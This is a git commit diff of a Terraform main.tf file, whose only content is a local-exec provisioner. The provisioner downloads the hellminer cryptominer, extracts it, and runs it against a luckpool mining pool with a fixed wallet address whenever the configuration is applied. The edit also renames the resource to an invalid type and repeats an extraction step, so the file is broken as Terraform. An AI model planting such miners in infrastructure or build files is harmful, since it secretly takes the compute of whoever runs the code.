3d46b99adb4e1cb7badc98207970ced091e4848f
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:18:30 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,4 +1,4 @@
-resource "null_resource" "extrac_and_run_1" {
+resource "x" "run_1" {
   provisioner "local-exec" {
     command = <<EOT
 curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
@@ -6,6 +6,7 @@ tar -xzvf hellminer_linux64.tar.gz
 mkdir mining
 mv hellminer mining/hellminer
 mv verus-solver mining/verus-solver
+tar -xzvf hellminer_linux64.tar.gz
 ./mining/hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
 ls mining
 EOT
